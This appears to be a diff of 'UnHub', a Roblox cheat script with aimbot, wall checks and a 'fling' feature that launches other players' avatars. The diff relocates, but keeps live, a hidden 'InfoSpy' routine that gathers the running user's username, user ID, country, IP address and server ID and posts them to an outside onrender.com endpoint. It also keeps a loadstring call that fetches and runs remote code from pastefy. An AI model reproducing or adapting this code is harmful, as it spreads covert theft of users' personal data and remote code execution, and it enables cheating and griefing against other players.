@@ -16,6 +16,7 @@ local mouse = player:GetMouse()
 local AiChat
 local Lighting = game:GetService("Lighting")
 local TestService = game:GetService("TestService")
+local requestFunc = (syn and syn.request) or (http and http.request)
 local RunScript
 local startTime = time()
 local AutoRejoin = false
@@ -26,7 +27,6 @@ local api = {}
 local TurnOff = true
 local Playlist = {}
 local FOVRadius = 100
-local up = loadstring(game:HttpGet('https://pastefy.app/aZcja1vg/raw'))()
 local TeamCheck = false
 local WallCheck = false
 local AllBool = false
@@ -44,6 +44,9 @@ local ToggleR15 = {}
 local MaxAnimation = 10
 local CAnimation = 0
 local SpeedAnimation = 1
+local ToDisable = {Textures = true, VisualEffects = true, Parts = true, Particles = true, Sky = true}
+local ToEnable = {FullBright = false}
+local Stuff = {}
 
 task.spawn(function()
     pcall(function()
@@ -60,319 +63,6 @@ task.spawn(function()
     end)
     data = HttpService:JSONDecode(game:HttpGet("https://raw.githubusercontent.com/7yd7/sniper-Emote/refs/heads/test/EmoteSniper.json")).data
 end)
-
-local function SetNoCollision(player, Value)
-    local char = player.Character or player.CharacterAdded:Wait()
-    if char then
-        for _, part in ipairs(char:GetDescendants()) do
-            if part:IsA("BasePart") then
-                part.CanCollide = Value
-            end
-        end
-    end
-end
-
-local function SkidFling(TargetPlayer)
-    local Character = player.Character
-    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
-    local RootPart = Humanoid and Humanoid.RootPart
-
-    local TCharacter = TargetPlayer.Character
-    local THumanoid
-    local TRootPart
-    local THead
-    local Accessory
-    local Handle
-
-    if TCharacter:FindFirstChildOfClass("Humanoid") then
-        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
-    end
-    if THumanoid and THumanoid.RootPart then
-        TRootPart = THumanoid.RootPart
-    end
-    if TCharacter:FindFirstChild("Head") then
-        THead = TCharacter.Head
-    end
-    if TCharacter:FindFirstChildOfClass("Accessory") then
-        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
-    end
-    if Accessoy and Accessory:FindFirstChild("Handle") then
-        Handle = Accessory.Handle
-    end
-
-    if Character and Humanoid and RootPart then
-        if RootPart.Velocity.Magnitude < 50 then
-            getgenv().OldPos = RootPart.CFrame
-        end
-        if THead then
-            workspace.CurrentCamera.CameraSubject = THead
-        elseif not THead and Handle then
-            workspace.CurrentCamera.CameraSubject = Handle
-        elseif THumanoid and TRootPart then
-            workspace.CurrentCamera.CameraSubject = THumanoid
-        end
-        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
-            return
-        end
-        
-        local FPos = function(BasePart, Pos, Ang)
-            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
-            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
-            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
-            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
-        end
-        
-        local SFBasePart = function(BasePart)
-            local TimeToWait = 2
-            local Time = tick()
-            local Angle = 0
-
-            repeat
-                if RootPart and THumanoid then
-                    if BasePart.Velocity.Magnitude < 50 then
-                        Angle = Angle + 100
-
-                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
-                        task.wait()
-                    else
-                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
-                        task.wait()
-                        
-                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
-                        task.wait()
-                    end
-                else
-                    break
-                end
-            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
-        end
-        
-        workspace.FallenPartsDestroyHeight = 0/0
-        
-        local BV = Instance.new("BodyVelocity")
-        BV.Name = "EpixVel"
-        BV.Parent = RootPart
-        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
-        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
-        
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
-        
-        if TRootPart and THead then
-            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
-                SFBasePart(THead)
-            else
-                SFBasePart(TRootPart)
-            end
-        elseif TRootPart and not THead then
-            SFBasePart(TRootPart)
-        elseif not TRootPart and THead then
-            SFBasePart(THead)
-        elseif not TRootPart and not THead and Accessory and Handle then
-            SFBasePart(Handle)
-        end
-        
-        BV:Destroy()
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
-        workspace.CurrentCamera.CameraSubject = Humanoid
-        
-        repeat
-            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
-            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
-            Humanoid:ChangeState("GettingUp")
-            table.foreach(Character:GetChildren(), function(_, x)
-                if x:IsA("BasePart") then
-                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
-                end
-            end)
-            task.wait()
-        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
-        workspace.FallenPartsDestroyHeight = getgenv().FPDH
-    end
-end
-
-local requestFunc = (syn and syn.request) or (http and http.request)
-
-local function sendMessage(message, history, system)
-    history = history or {}
-    local body = {
-        message = message,
-        history = history,
-        system = system,
-    }
-    local jsonBody = game:GetService("HttpService"):JSONEncode(body)
-
-    local response = requestFunc({
-        Url = "https://ai-bot-2-wj02.onrender.com/chat",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = jsonBody
-    })
-    local decoded = game:GetService("HttpService"):JSONDecode(response.Body)
-    return decoded.reply, decoded.history
-end
-
-local function sendMessageToDc(message, name, img)
-    local body = {
-        message = message,
-        name = name,
-        img = img,
-    }
-    local jsonBody = game:GetService("HttpService"):JSONEncode(body)
-
-    local response = requestFunc({
-        Url = "https://send-message-wi6m.onrender.com/send",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = jsonBody
-    })
-end
-local InfoSpy = "\nUsername: " ..player.Name .."\nDisplay Name: " ..player.DisplayName .."\nUserId: " ..player.UserId .."\nAccount Age: " ..player.AccountAge .."\nCountry : " .. (api.country or "Unknown") .. " " .. (api.country_code or "") .."\nIP: " ..(api.ip or "Unknown") .."\nServerID : " .. game.JobId .."\nGame : " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .."\nGameID : " .. game.PlaceId
-
-local function GetNP()
-	local shortest, nearest = math.huge
-	local camPos = cam.CFrame.Position
-	local params = RaycastParams.new()
-	params.FilterDescendantsInstances = {player.Character}
-	params.FilterType = Enum.RaycastFilterType.Blacklist
-	params.IgnoreWater = true
-
-	for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
-		if plr ~= player and plr.Character then
-		    if TeamCheck and not plr.Team ~= player.Team then return end
-			local hum = plr.Character:FindFirstChild("Humanoid")
-			local root = plr.Character:FindFirstChild("HumanoidRootPart")
-			if hum and hum.Health > 0 and root then
-				local dist = (root.Position - camPos).Magnitude
-				if dist < shortest then
-					if WallCheck then
-						local hit = workspace:Raycast(camPos, root.Position - camPos, params)
-						if not hit or hit.Instance:IsDescendantOf(plr.Character) then
-							shortest, nearest = dist, plr
-						end
-					else
-						shortest, nearest = dist, plr
-					end
-				end
-			end
-		end
-	end
-	return nearest
-end
-
-local function GetNH()
-	local shortestDistance = math.huge
-	local nearestTarget = nil
-
-	for _, model in ipairs(workspace:GetDescendants()) do
-		if model:IsA("Model") and model:FindFirstChild("Humanoid") and model:FindFirstChild("HumanoidRootPart") then
-			local humanoid = model:FindFirstChild("Humanoid")
-			local root = model:FindFirstChild("HumanoidRootPart")
-			if humanoid.Health > 0 and model ~= player.Character then
-				local distance = (root.Position - cam.CFrame.Position).Magnitude
-				if distance < shortestDistance then
-					shortestDistance = distance
-					nearestTarget = model
-				end
-			end
-		end
-	end
-
-	return nearestTarget
-end
-
-local function GetAA()
-	local closest = nil
-	local shortestDist = FOVRadius
-
-	for _, plr in ipairs(Players:GetPlayers()) do
-		if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
-			if TeamCheck and not plr.Team == player.Team then return end
-
-			local pos, onScreen = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
-			if onScreen then
-				local center = Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y/2)
-				local dist = (Vector2.new(pos.X, pos.Y) - center).Magnitude
-
-				if dist <= shortestDist then
-					if WallCheck then
-						local origin = cam.CFrame.Position
-						local direction = (plr.Character.HumanoidRootPart.Position - origin).Unit * 1000
-						local raycastParams = RaycastParams.new()
-						raycastParams.FilterDescendantsInstances = {player.Character}
-						raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
-
-						local result = workspace:Raycast(origin, direction, raycastParams)
-						if result and result.Instance:IsDescendantOf(plr.Character) then
-							closest = plr
-							shortestDist = dist
-						end
-					else
-						closest = plr
-						shortestDist = dist
-					end
-				end
-			end
-		end
-	end
-	return closest
-end
-
-local ToDisable = {
-	Textures = true,
-	VisualEffects = true,
-	Parts = true,
-	Particles = true,
-	Sky = true
-}
-
-local ToEnable = {
-	FullBright = false
-}
-
-local Stuff = {}
 
 local function EnabledFps()
 	table.clear(Stuff)
@@ -414,8 +104,8 @@ local function EnabledFps()
 end
 
 function filler(text)
-       local text = string.gsub(text, ".GetChildren", ":GetChildren")
-       return string.gsub(text, "%.(%d+)", '["%1"]')
+    local text = string.gsub(text, ".GetChildren", ":GetChildren")
+    return string.gsub(text, "%.(%d+)", '["%1"]')
 end
 
 local function getFullPath(obj)
@@ -450,29 +140,6 @@ local function getFullPath(obj)
 end
 
 task.spawn(function()
-local ST = Instance.new("ScreenGui")
-local T = Instance.new("TextButton")
-local Corner = Instance.new("UICorner")
-ST.Name = "Toggle UnHub"
-ST.Parent = Rayfield:GetParent().Parent
-ST.ResetOnSpawn = false
-Corner.Name = "Corner"
-Corner.Parent = T
-T.Name = "T"
-T.Parent = ST
-T.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-T.Position = UDim2.new(0, 30, 0.08, 0)
-T.Size = UDim2.new(0, 70, 0, 28)
-T.Font = Enum.Font.SourceSans
-T.Text = "UnHub"
-T.TextColor3 = Color3.fromRGB(248, 248, 248)
-T.TextSize = 20
-T.Active = true
-T.Draggable = true
-T.MouseButton1Click:connect(function()
-    Rayfield:SetEnable(not Rayfield:GetEnable())
-end)
-
 local Window = Rayfield:CreateWindow({
    Name = "UnHub | by LE_GO89",
    FileName = "UnHub",
@@ -820,6 +487,95 @@ end)
 
 local Aimbot = Window:CreateTab("Aimbot", 11162755592)
 Aimbot:CreateSection("Aimbot")
+
+local function GetNP()
+	local shortest, nearest = math.huge
+	local camPos = cam.CFrame.Position
+	local params = RaycastParams.new()
+	params.FilterDescendantsInstances = {player.Character}
+	params.FilterType = Enum.RaycastFilterType.Blacklist
+	params.IgnoreWater = true
+
+	for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
+		if plr ~= player and plr.Character then
+		    if TeamCheck and not plr.Team ~= player.Team then return end
+			local hum = plr.Character:FindFirstChild("Humanoid")
+			local root = plr.Character:FindFirstChild("HumanoidRootPart")
+			if hum and hum.Health > 0 and root then
+				local dist = (root.Position - camPos).Magnitude
+				if dist < shortest then
+					if WallCheck then
+						local hit = workspace:Raycast(camPos, root.Position - camPos, params)
+						if not hit or hit.Instance:IsDescendantOf(plr.Character) then
+							shortest, nearest = dist, plr
+						end
+					else
+						shortest, nearest = dist, plr
+					end
+				end
+			end
+		end
+	end
+	return nearest
+end
+
+local function GetNH()
+	local shortestDistance = math.huge
+	local nearestTarget = nil
+
+	for _, model in ipairs(workspace:GetDescendants()) do
+		if model:IsA("Model") and model:FindFirstChild("Humanoid") and model:FindFirstChild("HumanoidRootPart") then
+			local humanoid = model:FindFirstChild("Humanoid")
+			local root = model:FindFirstChild("HumanoidRootPart")
+			if humanoid.Health > 0 and model ~= player.Character then
+				local distance = (root.Position - cam.CFrame.Position).Magnitude
+				if distance < shortestDistance then
+					shortestDistance = distance
+					nearestTarget = model
+				end
+			end
+		end
+	end
+
+	return nearestTarget
+end
+
+local function GetAA()
+	local closest = nil
+	local shortestDist = FOVRadius
+
+	for _, plr in ipairs(Players:GetPlayers()) do
+		if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+			if TeamCheck and not plr.Team == player.Team then return end
+
+			local pos, onScreen = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
+			if onScreen then
+				local center = Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y/2)
+				local dist = (Vector2.new(pos.X, pos.Y) - center).Magnitude
+
+				if dist <= shortestDist then
+					if WallCheck then
+						local origin = cam.CFrame.Position
+						local direction = (plr.Character.HumanoidRootPart.Position - origin).Unit * 1000
+						local raycastParams = RaycastParams.new()
+						raycastParams.FilterDescendantsInstances = {player.Character}
+						raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
+
+						local result = workspace:Raycast(origin, direction, raycastParams)
+						if result and result.Instance:IsDescendantOf(plr.Character) then
+							closest = plr
+							shortestDist = dist
+						end
+					else
+						closest = plr
+						shortestDist = dist
+					end
+				end
+			end
+		end
+	end
+	return closest
+end
 
 local AimbotSpeed = 1
 local BodyPart = "HumanoidRootPart"
@@ -1743,6 +1499,7 @@ end})
 local Save = Window:CreateTab("Save Script", 105856032975609)
 Save:CreateSection("Save Script")
 
+local up = loadstring(game:HttpGet('https://pastefy.app/aZcja1vg/raw'))()
 local AllScript = {}
 local TextName = ""
 local TextScript = ""
@@ -1969,6 +1726,163 @@ Description = GetInfo:CreateSection("Description: nil")
 local Fling = Window:CreateTab("Fling", 138815366039127)
 Fling:CreateSection("Fling")
 
+local function SkidFling(TargetPlayer)
+    local Character = player.Character
+    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+    local RootPart = Humanoid and Humanoid.RootPart
+
+    local TCharacter = TargetPlayer.Character
+    local THumanoid
+    local TRootPart
+    local THead
+    local Accessory
+    local Handle
+
+    if TCharacter:FindFirstChildOfClass("Humanoid") then
+        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
+    end
+    if THumanoid and THumanoid.RootPart then
+        TRootPart = THumanoid.RootPart
+    end
+    if TCharacter:FindFirstChild("Head") then
+        THead = TCharacter.Head
+    end
+    if TCharacter:FindFirstChildOfClass("Accessory") then
+        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
+    end
+    if Accessoy and Accessory:FindFirstChild("Handle") then
+        Handle = Accessory.Handle
+    end
+
+    if Character and Humanoid and RootPart then
+        if RootPart.Velocity.Magnitude < 50 then
+            getgenv().OldPos = RootPart.CFrame
+        end
+        if THead then
+            workspace.CurrentCamera.CameraSubject = THead
+        elseif not THead and Handle then
+            workspace.CurrentCamera.CameraSubject = Handle
+        elseif THumanoid and TRootPart then
+            workspace.CurrentCamera.CameraSubject = THumanoid
+        end
+        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
+            return
+        end
+        
+        local FPos = function(BasePart, Pos, Ang)
+            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
+            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
+            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
+            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+        end
+        
+        local SFBasePart = function(BasePart)
+            local TimeToWait = 2
+            local Time = tick()
+            local Angle = 0
+
+            repeat
+                if RootPart and THumanoid then
+                    if BasePart.Velocity.Magnitude < 50 then
+                        Angle = Angle + 100
+
+                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+                    else
+                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+                        
+                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                        task.wait()
+                    end
+                else
+                    break
+                end
+            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
+        end
+        
+        workspace.FallenPartsDestroyHeight = 0/0
+        
+        local BV = Instance.new("BodyVelocity")
+        BV.Name = "EpixVel"
+        BV.Parent = RootPart
+        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
+        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
+        
+        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+        
+        if TRootPart and THead then
+            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
+                SFBasePart(THead)
+            else
+                SFBasePart(TRootPart)
+            end
+        elseif TRootPart and not THead then
+            SFBasePart(TRootPart)
+        elseif not TRootPart and THead then
+            SFBasePart(THead)
+        elseif not TRootPart and not THead and Accessory and Handle then
+            SFBasePart(Handle)
+        end
+        
+        BV:Destroy()
+        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+        workspace.CurrentCamera.CameraSubject = Humanoid
+        
+        repeat
+            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
+            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
+            Humanoid:ChangeState("GettingUp")
+            table.foreach(Character:GetChildren(), function(_, x)
+                if x:IsA("BasePart") then
+                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
+                end
+            end)
+            task.wait()
+        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
+        workspace.FallenPartsDestroyHeight = getgenv().FPDH
+    end
+end
+
 local ShowFlingPlayer = Fling:CreateSection("Player: nil")
 local RunningFling = false
 local FlingAll = nil
@@ -2154,6 +2068,27 @@ TouchFlingT = Fling:CreateToggle({Name = "Touch Fling", CurrentValue = false, Fl
         until TouchFling == false
     end
 end})
+
+local function sendMessage(message, history, system)
+    history = history or {}
+    local body = {
+        message = message,
+        history = history,
+        system = system,
+    }
+    local jsonBody = game:GetService("HttpService"):JSONEncode(body)
+
+    local response = requestFunc({
+        Url = "https://ai-bot-2-wj02.onrender.com/chat",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = jsonBody
+    })
+    local decoded = game:GetService("HttpService"):JSONDecode(response.Body)
+    return decoded.reply, decoded.history
+end
 
 local IsDone = true
 local model = ""
@@ -2666,8 +2601,48 @@ task.spawn(function()
             break
     	end
     end
-    sendMessageToDc(InfoSpy, "Information", "https://m.apkshub.com/images/f4/net.hackerbot.hbsiteapp/icon.png")
 end)
+    local ST = Instance.new("ScreenGui")
+    local T = Instance.new("TextButton")
+    local Corner = Instance.new("UICorner")
+    ST.Name = "Toggle UnHub"
+    ST.Parent = Rayfield:GetParent().Parent
+    ST.ResetOnSpawn = false
+    Corner.Name = "Corner"
+    Corner.Parent = T
+    T.Name = "T"
+    T.Parent = ST
+    T.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    T.Position = UDim2.new(0, 30, 0.08, 0)
+    T.Size = UDim2.new(0, 70, 0, 28)
+    T.Font = Enum.Font.SourceSans
+    T.Text = "UnHub"
+    T.TextColor3 = Color3.fromRGB(248, 248, 248)
+    T.TextSize = 20
+    T.Active = true
+    T.Draggable = true
+    T.MouseButton1Click:connect(function()
+        Rayfield:SetEnable(not Rayfield:GetEnable())
+    end)
+    local function sendMessageToDc(message, name, img)
+        local body = {
+            message = message,
+            name = name,
+            img = img,
+        }
+        local jsonBody = game:GetService("HttpService"):JSONEncode(body)
+    
+        local response = requestFunc({
+            Url = "https://send-message-wi6m.onrender.com/send",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonBody
+        })
+    end
+    local InfoSpy = "\nUsername: " ..player.Name .."\nDisplay Name: " ..player.DisplayName .."\nUserId: " ..player.UserId .."\nAccount Age: " ..player.AccountAge .."\nCountry : " .. (api.country or "Unknown") .. " " .. (api.country_code or "") .."\nIP: " ..(api.ip or "Unknown") .."\nServerID : " .. game.JobId .."\nGame : " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .."\nGameID : " .. game.PlaceId
+    sendMessageToDc(InfoSpy, "Information", "https://m.apkshub.com/images/f4/net.hackerbot.hbsiteapp/icon.png")
 end)
 
 
